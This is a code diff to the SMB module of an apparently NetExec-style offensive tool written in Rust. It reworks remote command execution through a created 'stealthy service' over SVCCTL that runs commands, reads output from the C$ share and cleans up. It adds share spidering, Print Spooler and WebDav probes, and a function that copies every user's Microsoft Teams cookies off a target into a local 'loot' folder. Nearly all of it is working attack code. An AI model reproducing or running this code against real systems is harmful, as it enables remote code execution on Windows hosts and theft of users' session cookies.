@@ -6,6 +6,7 @@
 
 use crate::rpc::{DcerpcHeader, PacketType};
 use crate::{CommandOutput, NxcProtocol, NxcSession};
+use crate::obfuscation::deobfuscate;
 use anyhow::Result;
 use async_trait::async_trait;
 use nxc_auth::{AuthResult, Credentials};
@@ -464,22 +465,26 @@ impl NxcProtocol for SmbProtocol {
         &["enum_shares", "secretsdump", "sam"]
     }
 
-    async fn connect(&self, target: &str, port: u16) -> Result<Box<dyn NxcSession>> {
+    async fn connect(&self, target: &str, port: u16, proxy: Option<&str>) -> Result<Box<dyn NxcSession>> {
         let addr = format!("{}:{}", target, port);
         let target_owned = target.to_string();
         let timeout = self.timeout;
+        let proxy_owned = proxy.map(|s| s.to_string());
+
+        let target_clone = target_owned.clone();
+        let mut stream = crate::connection::connect(&target_clone, port, proxy_owned.as_deref())
+            .await
+            .map_err(|e| anyhow::anyhow!("Connection error: {}", e))?;
+        
+        let mut std_stream = stream.into_std()?;
+        std_stream.set_read_timeout(Some(timeout))?;
+        std_stream.set_write_timeout(Some(timeout))?;
 
         let session = tokio::task::spawn_blocking(move || -> Result<SmbSession> {
-            let mut stream = TcpStream::connect_timeout(
-                &addr
-                    .parse()
-                    .map_err(|e| anyhow::anyhow!("Invalid address {}: {}", addr, e))?,
-                timeout,
-            )?;
-            stream.set_read_timeout(Some(timeout))?;
-            stream.set_write_timeout(Some(timeout))?;
+            let host_info = Self::negotiate(&mut std_stream).unwrap_or_default();
+            
+            // We don't need to convert to tokio stream here since we use std_stream inline and SmbSession has Mutex<Some(std_stream)>
 
-            let host_info = Self::negotiate(&mut stream).unwrap_or_default();
             Ok(SmbSession {
                 target: target_owned,
                 port,
@@ -487,7 +492,7 @@ impl NxcProtocol for SmbProtocol {
                 host_info,
                 session_id: 0,
                 tree_id: 0,
-                stream: Mutex::new(Some(stream)),
+                stream: Mutex::new(Some(std_stream)),
             })
         })
         .await??;
@@ -588,25 +593,23 @@ impl NxcProtocol for SmbProtocol {
     }
 
     async fn execute(&self, session: &dyn NxcSession, cmd: &str) -> Result<CommandOutput> {
-        let smb_sess = match session.protocol() {
-            "smb" => unsafe { &*(session as *const dyn NxcSession as *const SmbSession) },
-            _ => return Err(anyhow::anyhow!("Invalid session type")),
-        };
-
-        use crate::obfuscation::deobfuscate;
-        let svcctl_pipe = deobfuscate(&[0x31, 0x34, 0x21, 0x21, 0x36, 0x2e, 0x2e], 0x42); // "svcctl"
         
         debug!("SMB: Executing '{}' via enhanced smbexec (SVCCTL)", cmd);
 
         // 1. Bind to svcctl
         use crate::rpc::{DcerpcBind, DcerpcRequest, UUID_SVCCTL, PacketType, svcctl};
+        let svcctl_pipe = "svcctl";
         let bind = DcerpcBind::new(UUID_SVCCTL, 2, 0);
-        let _bind_resp = self.call_rpc(smb_sess, &svcctl_pipe, PacketType::Bind, 1, bind.to_bytes()).await?;
+        let smb_session = match session.protocol() {
+            "smb" => unsafe { &*(session as *const dyn NxcSession as *const SmbSession) },
+            _ => return Err(anyhow::anyhow!("Invalid session type")),
+        };
+        let _bind_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Bind, 1, bind.to_bytes()).await?;
 
         // 2. Open SC Manager
         let open_sc_req = self.build_svcctl_open_sc_manager();
         let rpc_req = DcerpcRequest::new(svcctl::OPEN_SC_MANAGER, open_sc_req);
-        let sc_manager_resp = self.call_rpc(smb_sess, &svcctl_pipe, PacketType::Request, 2, rpc_req.to_bytes()).await?;
+        let sc_manager_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 2, rpc_req.to_bytes()).await?;
         
         if sc_manager_resp.len() < 44 { return Err(anyhow::anyhow!("Invalid OpenSCManager response")); }
         let sc_handle: [u8; 20] = sc_manager_resp[24..44].try_into()?;
@@ -624,7 +627,7 @@ impl NxcProtocol for SmbProtocol {
         info!("SMB: Creating stealthy service {}...", svc_name);
         let create_svc_req = self.build_svcctl_create_service(&sc_handle, &svc_name, &bin_path);
         let rpc_req = DcerpcRequest::new(svcctl::CREATE_SERVICE, create_svc_req);
-        let create_resp = self.call_rpc(smb_sess, &svcctl_pipe, PacketType::Request, 3, rpc_req.to_bytes()).await?;
+        let create_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 3, rpc_req.to_bytes()).await?;
 
         if create_resp.len() < 44 { return Err(anyhow::anyhow!("Invalid CreateService response")); }
         let svc_handle: [u8; 20] = create_resp[24..44].try_into()?;
@@ -632,7 +635,7 @@ impl NxcProtocol for SmbProtocol {
         // 4. Start Service
         let start_req = self.build_svcctl_start_service(&svc_handle);
         let rpc_req = DcerpcRequest::new(svcctl::START_SERVICE, start_req);
-        let _start_resp = self.call_rpc(smb_sess, &svcctl_pipe, PacketType::Request, 4, rpc_req.to_bytes()).await?;
+        let _start_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 4, rpc_req.to_bytes()).await?;
         
         // 5. Poll for completion instead of fixed sleep
         info!("SMB: Service {} started. Polling for completion...", svc_name);
@@ -642,7 +645,7 @@ impl NxcProtocol for SmbProtocol {
             // Query service status (OpNum 6)
             let query_req = self.build_svcctl_query_status(&svc_handle);
             let rpc_req = DcerpcRequest::new(svcctl::QUERY_SERVICE_STATUS, query_req);
-            if let Ok(query_resp) = self.call_rpc(smb_sess, &svcctl_pipe, PacketType::Request, 5, rpc_req.to_bytes()).await {
+            if let Ok(query_resp) = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 5, rpc_req.to_bytes()).await {
                 if query_resp.len() >= 36 {
                      let state = u32::from_le_bytes(query_resp[28..32].try_into().unwrap_or([0; 4]));
                      if state == 1 { // SERVICE_STOPPED
@@ -660,13 +663,13 @@ impl NxcProtocol for SmbProtocol {
         // 6. Delete Service (Cleanup)
         let del_req = self.build_svcctl_delete_service(&svc_handle);
         let rpc_req = DcerpcRequest::new(svcctl::DELETE_SERVICE, del_req);
-        let _del_resp = self.call_rpc(smb_sess, &svcctl_pipe, PacketType::Request, 6, rpc_req.to_bytes()).await?;
+        let _del_resp = self.call_rpc(smb_session, &svcctl_pipe, PacketType::Request, 6, rpc_req.to_bytes()).await?;
 
         // 7. Read Output from file
-        let stdout = self.read_file(smb_sess, "C$", &format!("windows\\temp\\{}", output_file)).await.unwrap_or_else(|_| "[!] Failed to read output file".to_string());
+        let stdout = self.read_file(smb_session, "C$", &format!("windows\\temp\\{}", output_file)).await.unwrap_or_else(|_| "[!] Failed to read output file".to_string());
         
         // 8. Delete output file from target
-        if let Err(e) = self.delete_file(smb_sess, "C$", &format!("windows\\temp\\{}", output_file)).await {
+        if let Err(e) = self.delete_file(smb_session, "C$", &format!("windows\\temp\\{}", output_file)).await {
             debug!("SMB: Failed to delete output file {}: {}", output_file, e);
         } else {
             debug!("SMB: Cleared output file {}", output_file);
@@ -714,6 +717,100 @@ impl SmbProtocol {
         report.push_str("\nNote: Hive files are stored on the target. Manual download or implementing full SMB2 READ for these paths is required to parse offline.\n");
         report.push_str("Cleanup: Hive files remain in C:\\windows\\temp\\ until manual removal or further automation.");
 
+        Ok(report)
+    }
+
+    /// Recursively list files in all accessible shares (Spidering).
+    pub async fn spider_shares(&self, session: &SmbSession, depth: usize) -> Result<Vec<String>> {
+        let shares = self.list_shares(session).await?;
+        let mut all_files = Vec::new();
+
+        for share in shares {
+            if share.read_access && share.name != "IPC$" {
+                info!("SMB: Spidering share {}...", share.name);
+                let files = self.spider_directory(session, &share.name, "", depth).await?;
+                for f in files {
+                    all_files.push(format!("{}\\{}", share.name, f));
+                }
+            }
+        }
+        Ok(all_files)
+    }
+
+    async fn spider_directory(&self, session: &SmbSession, share: &str, path: &str, depth: usize) -> Result<Vec<String>> {
+        if depth == 0 { return Ok(vec![]); }
+        let mut results = Vec::new();
+        
+        match self.list_directory(session, share, path).await {
+            Ok(entries) => {
+                for entry in entries {
+                    let full_path = if path.is_empty() { entry.clone() } else { format!("{}\\{}", path, entry) };
+                    results.push(full_path.clone());
+                    
+                    // Recursive call for subdirectories (simplified: try to list it, if it works, it's a dir)
+                    if let Ok(sub) = Box::pin(self.spider_directory(session, share, &full_path, depth - 1)).await {
+                        results.extend(sub);
+                    }
+                }
+            }
+            Err(_) => debug!("SMB: Skipping spider on potential file or protected dir: {}", path),
+        }
+        Ok(results)
+    }
+
+    /// Check if Print Spooler is available via RPC.
+    pub async fn check_spooler(&self, session: &SmbSession) -> Result<bool> {
+        use crate::rpc::{DcerpcBind, PacketType, UUID_SPOOLSS};
+        let bind = DcerpcBind::new(UUID_SPOOLSS, 1, 0);
+        match self.call_rpc(session, "spoolss", PacketType::Bind, 1, bind.to_bytes()).await {
+            Ok(_) => {
+                info!("SMB: Print Spooler service is ENABLED on {}", session.target);
+                Ok(true)
+            }
+            Err(_) => {
+                debug!("SMB: Print Spooler service appears disabled on {}", session.target);
+                Ok(false)
+            }
+        }
+    }
+
+    /// Check if WebDav is likely enabled.
+    pub async fn check_webdav(&self, session: &SmbSession) -> Result<bool> {
+        // Simplified check: WebDav often uses port 80/443 or specific pipes. 
+        // Real detection via PROPFIND over HTTP would be better, but for SMB protocol we check service status if admin.
+        if session.admin {
+             let output = self.execute(session, "sc query webclient").await?;
+             Ok(output.stdout.contains("RUNNING") || output.stdout.contains("STOPPED"))
+        } else {
+             Err(anyhow::anyhow!("Admin privileges required for service-based WebDav check"))
+        }
+    }
+
+    /// Attempt to steal Microsoft Teams cookies if admin.
+    pub async fn steal_teams_cookies(&self, session: &SmbSession) -> Result<String> {
+        if !session.admin {
+            return Err(anyhow::anyhow!("Admin privileges required to steal Teams cookies"));
+        }
+        
+        // Profiles locations: C:\Users\<user>\AppData\Roaming\Microsoft\Teams\Cookies
+        // We first need to find users.
+        let users = self.list_directory(session, "C$", "Users").await?;
+        let mut report = String::from("Teams Cookie Extraction Report:\n");
+        
+        for user in users {
+            if user == "Public" || user == "All Users" || user == "Default" || user == "Default User" { continue; }
+            let cookie_path = format!("Users\\{}\\AppData\\Roaming\\Microsoft\\Teams\\Cookies", user);
+            match self.read_file(session, "C$", &cookie_path).await {
+                Ok(data) => {
+                    report.push_str(&format!("  [+] Found cookies for user {}: {} bytes\n", user, data.len()));
+                    // Save locally
+                    let local_path = format!("loot/teams_cookies_{}_{}.bin", user, session.target);
+                    std::fs::create_dir_all("loot")?;
+                    std::fs::write(&local_path, data)?;
+                }
+                Err(_) => debug!("SMB: No Teams cookies found for user {}", user),
+            }
+        }
         Ok(report)
     }
     fn build_session_setup_ntlm_negotiate(&self, _creds: &Credentials) -> Vec<u8> {
